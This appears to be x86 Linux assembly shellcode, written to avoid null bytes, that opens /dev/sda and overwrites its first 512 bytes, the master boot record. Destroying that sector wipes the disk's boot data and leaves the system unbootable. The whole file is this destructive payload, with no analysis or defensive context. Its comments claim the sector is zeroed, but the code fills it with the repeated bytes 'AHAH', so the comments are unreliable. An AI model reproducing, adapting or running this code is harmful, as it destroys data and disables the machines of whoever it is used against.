
SYS_OPEN equ		5
SYS_WRITE equ		4
O_RDWR equ		2

global _start

section .text

_start:
	; open the /dev/sda
	xor edx, edx
	push edx
	push 0x6164732f
	push 0x7665642f
	mov ebx, esp

	mov al, SYS_OPEN
	mov cl, O_RDWR
	int 0x80

	; write the MBR with zero's.
	; with the size of 512 bytes.
	; (128 * 4 bytes)

	mov ebx, eax		; file pointer to ebx
	xor edx, edx
	mov eax, edx		; zero out eax

	mov cl, 128		; counter of loop
fill:
	push 0x48414841		; push to stack
	loop fill

	mov al, SYS_WRITE

	mov ecx, esp

	xor edx, edx		; zero out edx

	; we need to find a way to store 512 without a zero.
	mov dx, 512
	int 0x80
